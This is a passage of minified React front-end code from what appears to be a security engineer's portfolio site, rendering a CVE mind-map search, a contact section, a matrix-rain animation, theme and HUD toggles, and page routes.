details."}),d.jsxs("form",{className:"mindmap-search",onSubmit:x,children:[d.jsx("input",{type:"text",placeholder:"Search CVE ID (e.g., CVE-2025-12020)",value:u,onChange:z=>m(z.target.value)}),d.jsx("button",{type:"submit",className:"button ghost",children:"Highlight"}),d.jsx("button",{type:"button",className:"button ghost",onClick:y,children:"Reset"})]}),o&&d.jsxs("div",{className:"mindmap-hover",children:[d.jsx("div",{className:"hover-title",children:o.name}),d.jsxs("div",{className:"hover-meta",children:[d.jsx("span",{className:"pill",children:o.type}),(p=o.metrics)!=null&&p.total?d.jsxs("span",{className:"pill",children:["Total: ",o.metrics.total]}):null,(f=o.metrics)!=null&&f.kev?d.jsxs("span",{className:"pill",children:["KEV: ",o.metrics.kev]}):null,(v=o.metrics)!=null&&v.maxCvss?d.jsxs("span",{className:"pill",children:["Max CVSS: ",o.metrics.maxCvss]}):null,(w=o.metrics)!=null&&w.latestYear?d.jsxs("span",{className:"pill",children:["Latest: ",o.metrics.latestYear]}):null,(_=o.info)!=null&&_.severity?d.jsxs("span",{className:"pill",children:["Severity: ",o.info.severity]}):null,(N=o.info)!=null&&N.cvss?d.jsxs("span",{className:"pill",children:["CVSS: ",o.info.cvss]}):null,(A=o.info)!=null&&A.year?d.jsxs("span",{className:"pill",children:["Year: ",o.info.year]}):null,(P=o.info)!=null&&P.kev?d.jsx("span",{className:"pill kev",children:"KEV"}):null]})]})]}),d.jsxs("div",{className:"mindmap-stage mindmap-shell",children:[d.jsx("header",{className:"blog-welcome-section compact overlay",children:d.jsxs("div",{className:"container text-center",children:[d.jsx("h1",{children:uu.headline}),d.jsx("p",{className:"blog-subtitle",children:uu.datasetHint})]})}),d.jsx("div",{className:"mindmap-canvas",children:d.jsx(V1,{data:n,onSelectCve:k,onFocusPath:i,highlightId:h,onHover:c},a)})]}),d.jsx(Mv,{cve:t,onClose:()=>s(null)})]})}function G1(){const e="hemparekh1596@gmail.com",[n,t]=S.useState(!1),s=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return d.jsx("section",{className:"contact-strip",id:"contact",children:d.jsxs("div",{className:"container contact-grid",children:[d.jsxs("div",{children:[d.jsx("p",{className:"pill",children:"Let’s talk"}),d.jsx("h2",{children:"Signal received. Drop a note and let’s build secure systems."}),d.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&d.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),d.jsxs("div",{className:"contact-actions",children:[d.jsx("button",{className:"button primary",onClick:s,type:"button",children:"Copy Email"}),d.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),d.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function Y1(){const[e,n]=S.useState(0);return S.useEffect(()=>{const t=()=>{const{scrollTop:s,scrollHeight:r,clientHeight:i}=document.documentElement,a=r>i?s/(r-i)*100:0;n(Math.min(100,Math.max(0,a)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),d.jsx("div",{className:"scroll-progress",children:d.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function q1(){const[e,n]=S.useState(!1);return S.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?d.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function X1(){const e=S.useRef(null),n=S.useRef(null);return S.useEffect(()=>{const t=e.current;if(!t)return()=>{};const s=t.getContext("2d");let r=t.width=window.innerWidth,i=t.height=window.innerHeight;const a=16;let l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:1+Math.random()*2}));const c="アカサタナハマヤラワ0123456789日田由止育宇禾水火木金土文ﾊﾐﾋﾑﾍﾎｱｶｻﾀﾅﾊﾏ",u=()=>{s.fillStyle="rgba(0, 0, 0, 0.1)",s.fillRect(0,0,r,i),s.font=`${a}px "IBM Plex Mono", monospace`,o.forEach((h,g)=>{const k=c[Math.floor(Math.random()*c.length)],y=g*a,x=h.y*a;s.fillStyle="rgba(57, 255, 20, 0.9)",s.fillText(k,y,x),s.fillStyle="rgba(57, 255, 20, 0.25)",s.fillText(k,y,x-a),h.y+=h.speed,h.y*a>i&&Math.random()>.96&&(h.y=0,h.speed=1+Math.random()*2)}),n.current=requestAnimationFrame(u)},m=()=>{r=t.width=window.innerWidth,i=t.height=window.innerHeight,l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:1+Math.random()*2}))};return window.addEventListener("resize",m),u(),()=>{window.removeEventListener("resize",m),n.current&&cancelAnimationFrame(n.current)}},[]),d.jsx("canvas",{ref:e,className:"matrix-rain","aria-hidden":"true"})}function K1(){const[e,n]=S.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return S.useEffect(()=>{const s=document.body;s.classList.remove("light","dark"),s.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(s=>s==="light"?"dark":"light")}}}function Q1(){const{theme:e,toggleTheme:n}=K1(),[t,s]=S.useState(!0),[r,i]=S.useState(!0),a=S.useCallback((o,c)=>{const u=document.body;u&&(o?u.classList.remove("hud-scanlines-off"):u.classList.add("hud-scanlines-off"),c?u.classList.remove("hud-noise-off"):u.classList.add("hud-noise-off"))},[]);S.useEffect(()=>{try{const o=localStorage.getItem("hud:scanlines")!=="off",c=localStorage.getItem("hud:noise")!=="off";s(o),i(c),a(o,c)}catch{a(!0,!0)}},[a]),S.useEffect(()=>{try{localStorage.setItem("hud:scanlines",t?"on":"off"),localStorage.setItem("hud:noise",r?"on":"off")}catch{}a(t,r)},[t,r,a]);const l=S.useCallback(()=>{if(typeof window<"u"){window.dispatchEvent(new CustomEvent("hud:reset-layout",{detail:"all"}));try{Object.keys(localStorage).filter(o=>o.startsWith("hud:window:")||o.startsWith("hud:")).forEach(o=>localStorage.removeItem(o))}catch{}}},[]);return S.useEffect(()=>{const o=c=>{if(!((c.ctrlKey||c.metaKey)&&c.shiftKey))return;const u=c.key.toLowerCase();u==="r"&&(c.preventDefault(),l()),u==="s"&&(c.preventDefault(),s(m=>!m)),u==="n"&&(c.preventDefault(),i(m=>!m))};return window.addEventListener("keydown",o),()=>window.removeEventListener("keydown",o)},[l]),d.jsx(Dg,{children:d.jsxs("div",{className:"app-shell",children:[d.jsx(X1,{}),d.jsx(Y1,{}),d.jsx(Vg,{onToggleTheme:n,theme:e}),d.jsx("main",{children:d.jsxs(Lg,{children:[d.jsx(Sn,{path:"/",element:d.jsx(Vc,{})}),d.jsx(Sn,{path:"/blogs",element:d.jsx(av,{})}),d.jsx(Sn,{path:"/projects",element:d.jsx(Av,{})}),d.jsx(Sn,{path:"/certifications",element:d.jsx(Ov,{})}),d.jsx(Sn,{path:"/blog/:slug",element:d.jsx(Sv,{})}),d.jsx(Sn,{path:"/cve-map",element:d.jsx($1,{})}),d.jsx(Sn,{path:"*",element:d.jsx(Vc,{})})]})}),d.jsx(G1,{}),d.jsx(Hg,{}),d.jsx(q1,{})]})})}Sd(document.getElementById("root")).render(d.jsx(xu.StrictMode,{children:d.jsx(Q1,{})}));
